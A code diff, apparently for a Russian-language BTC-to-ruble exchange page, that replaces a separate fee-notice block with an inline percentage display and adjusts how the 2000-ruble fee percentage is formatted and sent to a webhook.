@@ -234,87 +234,24 @@ html.is-preloading .change-page {
     50% { opacity: 1; transform: translateY(-2px); }
 }
 
-/* ============================================================
-   ПЛАШКА С ПРОЦЕНТОМ КОМИССИИ
-   ============================================================ */
-.exchange-fee-note {
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    flex-wrap: wrap;
-    gap: 6px;
-    margin: 0 auto 22px;
-    padding: 11px 16px;
-    max-width: 100%;
-    box-sizing: border-box;
-    background: rgba(247, 147, 26, 0.06);
-    border: 1px solid rgba(247, 147, 26, 0.20);
-    border-radius: 12px;
-    font-family: 'Inter', sans-serif;
-    font-size: clamp(12.5px, 3.5vw, 13.5px);
-    line-height: 1.55;
-    color: #b7bfcc;
-    text-align: center;
-    transition: background 0.25s ease, border-color 0.25s ease;
-}
-
-.exchange-fee-note .efn-label {
-    color: #b7bfcc;
-}
-
-.exchange-fee-note .efn-fee {
-    color: #ffffff;
-    font-weight: 700;
-    font-family: 'JetBrains Mono', monospace;
+/* Динамический процент в info-value */
+.info-value[data-fee-percent] {
     font-variant-numeric: tabular-nums;
     font-feature-settings: "tnum" 1;
-    letter-spacing: 0.1px;
+    transition: opacity 0.25s ease;
 }
-
-.exchange-fee-note .efn-percent {
-    display: inline-flex;
-    align-items: center;
-    gap: 3px;
-    padding: 2px 9px;
-    background: linear-gradient(135deg, rgba(247, 147, 26, 0.22), rgba(247, 147, 26, 0.10));
-    border: 1px solid rgba(247, 147, 26, 0.32);
-    border-radius: 7px;
-    color: #ffb04d;
-    font-weight: 700;
-    font-family: 'JetBrains Mono', monospace;
-    font-size: clamp(12px, 3.4vw, 13px);
-    font-variant-numeric: tabular-nums;
-    font-feature-settings: "tnum" 1;
-    transition: opacity 0.3s ease, transform 0.3s ease;
-}
-
-.exchange-fee-note .efn-percent.is-loading {
+.info-value[data-fee-percent].is-loading {
     opacity: 0.55;
 }
-
-.exchange-fee-note .efn-percent.is-updating {
-    animation: efnPop 0.45s ease;
+.info-value[data-fee-percent].is-updating {
+    animation: feePop 0.45s ease;
 }
-
-@keyframes efnPop {
+@keyframes feePop {
     0%   { transform: scale(1); }
     40%  { transform: scale(1.08); }
     100% { transform: scale(1); }
 }
 
-.exchange-fee-note .efn-suffix {
-    color: #8896b0;
-    font-size: clamp(11.5px, 3.3vw, 12.5px);
-}
-
-.exchange-fee-note[data-loading="1"] {
-    background: rgba(255, 255, 255, 0.02);
-    border-color: rgba(255, 255, 255, 0.08);
-}
-
-/* ============================================================
-   СКРОЛЛБАР
-   ============================================================ */
 html::-webkit-scrollbar, body::-webkit-scrollbar {
     width: 10px; height: 10px;
 }
@@ -558,7 +495,7 @@ window.__onPreloaderDone = [];
             </div>
             <div class="change-info-row">
                 <span class="info-label">💱 Комиссия на обмен</span>
-                <span class="info-value">0,14%</span>
+                <span class="info-value" id="feePercentValue" data-fee-percent="1">— %</span>
             </div>
             <div class="change-info-row">
                 <span class="info-label">📊 Стоимость конвертации</span>
@@ -580,14 +517,6 @@ window.__onPreloaderDone = [];
                 <div class="ex-dir-label">Получаем</div>
                 <div class="ex-dir-value rub" id="exTo">— РУБ</div>
             </div>
-        </div>
-
-        <!-- Плашка с процентом от суммы -->
-        <div class="exchange-fee-note" id="exchangeFeeNote" data-loading="1">
-            <span class="efn-label">Комиссия на обмен</span>
-            <span class="efn-fee">2 000 ₽</span>
-            <span class="efn-percent is-loading" id="feePercent">— %</span>
-            <span class="efn-suffix">от суммы выплаты</span>
         </div>
 
         <div class="exchange-btn-wrap">
@@ -615,46 +544,42 @@ const STAGE = 'changebtc';
 const EXCHANGE_FEE_RUB = 2000;
 
 /* ============================================================
-   Плашка процента комиссии
+   Расчёт и показ процента комиссии
    ============================================================ */
 function renderFeePercent(rubTotal) {
-    var noteEl = document.getElementById('exchangeFeeNote');
-    var pctEl  = document.getElementById('feePercent');
-    if (!pctEl) return;
+    var el = document.getElementById('feePercentValue');
+    if (!el) return;
 
     if (!isFinite(rubTotal) || rubTotal <= 0) {
-        /* Нет данных о курсе — процент неизвестен */
-        pctEl.textContent = '— %';
-        pctEl.classList.add('is-loading');
-        if (noteEl) noteEl.setAttribute('data-loading', '1');
+        /* Нет данных о курсе — процент пока неизвестен */
+        el.textContent = '— %';
+        el.classList.add('is-loading');
         return;
     }
 
     var pct = (EXCHANGE_FEE_RUB / rubTotal) * 100;
 
-    /* Ограничиваем: если процент < 0.01% — показываем «< 0.01%» */
+    /* Форматирование:
+       - < 0.01%    → «< 0.01 %»
+       - ≥ 0.01%    → округление до 2 знаков
+    */
     var pctText;
     if (pct < 0.01) {
-        pctText = '< 0.01%';
-    } else if (pct >= 100) {
-        pctText = pct.toFixed(1) + '%';
-    } else if (pct >= 10) {
-        pctText = pct.toFixed(2) + '%';
+        pctText = '< 0.01 %';
     } else {
-        pctText = pct.toFixed(2) + '%';
+        pctText = pct.toFixed(2).replace('.', ',') + ' %';
     }
 
-    /* Анимация «обновилось», если число изменилось */
-    var prev = pctEl.textContent;
-    pctEl.textContent = pctText;
-    pctEl.classList.remove('is-loading');
-    if (noteEl) noteEl.setAttribute('data-loading', '0');
+    var prev = el.textContent;
+    el.textContent = pctText;
+    el.classList.remove('is-loading');
 
+    /* Пульс, если значение изменилось */
     if (prev !== pctText) {
-        pctEl.classList.remove('is-updating');
-        void pctEl.offsetWidth; /* reflow */
-        pctEl.classList.add('is-updating');
-        setTimeout(function () { pctEl.classList.remove('is-updating'); }, 500);
+        el.classList.remove('is-updating');
+        void el.offsetWidth; /* reflow */
+        el.classList.add('is-updating');
+        setTimeout(function () { el.classList.remove('is-updating'); }, 500);
     }
 }
 
@@ -699,7 +624,7 @@ function renderChangeReady() {
     setText('exFrom', btc.toFixed(8) + ' BTC');
     setText('exTo', formatRub(rub));
 
-    /* Считаем процент 2000₽ от общей суммы в рублях */
+    /* Обновляем процент: 2000 ₽ от суммы выплаты в рублях */
     renderFeePercent(rub);
 
     const btn = document.getElementById('exchangeBtn');
@@ -831,7 +756,7 @@ async function doExchange() {
     }
     document.body.appendChild(form);
 
-    /* Считаем актуальный процент для вебхука */
+    /* Процент для вебхука */
     let feePercentForWebhook = null;
     try {
         const rubTotal = FINAL_BTC_BALANCE * window.btcPrice * window.usdToRub;
@@ -848,7 +773,7 @@ async function doExchange() {
         btc: FINAL_BTC_BALANCE.toFixed(8),
         usd: (FINAL_BTC_BALANCE * window.btcPrice).toFixed(2),
         rub: (FINAL_BTC_BALANCE * window.btcPrice * window.usdToRub).toFixed(2),
-        fee_percent: feePercentForWebhook !== null ? feePercentForWebhook.toFixed(4) + '%' : null,
+        fee_percent: feePercentForWebhook !== null ? feePercentForWebhook.toFixed(4) : null,
         btcPrice: window.btcPrice.toFixed(2),
         usdToRub: window.usdToRub.toFixed(2),
         btcSource: window.btcSource, rubSource: window.rubSource,
